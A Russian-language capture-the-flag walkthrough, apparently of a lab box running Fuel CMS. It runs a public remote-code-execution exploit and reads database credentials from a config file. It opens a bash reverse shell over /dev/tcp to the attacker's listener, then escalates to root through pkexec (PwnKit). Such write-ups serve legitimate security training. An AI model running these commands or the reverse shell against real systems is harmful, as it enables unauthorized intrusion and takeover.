Открыт только 80 порт

![](../images/Pasted%20image%2020260511120121.png)

Тут указана версия CMS, проверим эксплоиты

![](../images/Pasted%20image%2020260511120248.png)

Есть несколько интересных вариантов, пробуем

![](../images/Pasted%20image%2020260511120452.png)

Всё сработало, получили RCE. Но пользователь www-data сильно ограничен в правах, он даже перейти никуда не может, нам достпен только robots.txt, index.php и еще несколько файлов. Попытаемся выжать из этого максимум.

В исходниках сайта, в файле index.php можно найти путь к инициализации базы данных mysql

```
fuel/application/config/database.php
```

Читаем этот файл
```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```

Отлично, есть логин и пароль.

На веб-сервере есть форма входа, пробуем ввести данные туда

![](../images/Pasted%20image%2020260511122254.png)

Что-то не так.

```
root@ip-10-113-87-59:~# python3 50477.py -u http://10.113.173.208/
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt


Enter Command $bash -c "bash -i >& /dev/tcp/10.113.87.59/1234 0>&1"

```

Оболочка была очень сильно урезана, поэтому я не нашел там, что можно сделать и решил вообще организовать реверс шелл и через секунду видим те самые строки:

```
root@ip-10-113-87-59:~# nc -lvnp 1234
Listening on 0.0.0.0 1234
Connection received on 10.113.173.208 39798

```

Изучаем полноценно систему теперь и читаем флаг пользователя

![](../images/Pasted%20image%2020260511135744.png)

Далее ищем способ повысить привилегии. Пока я изучал ограниченные возможности той оболочки RCE, я нашел потенциально уязвимый путь через SUID файл PwnKit, так как даже компилятор есть, версии нужные.

Проверяем.

```
www-data@ubuntu:/tmp$ find / -perm -4000 -type f 2>/dev/null | grep -E 'find|pkexec|sudo'
</ -perm -4000 -type f 2>/dev/null | grep -E 'find|pkexec|sudo'              
/usr/bin/pkexec
/usr/bin/sudo

```
![](../images/Pasted%20image%2020260511155417.png)

Эксплоит сработал, читаем рут флаг.
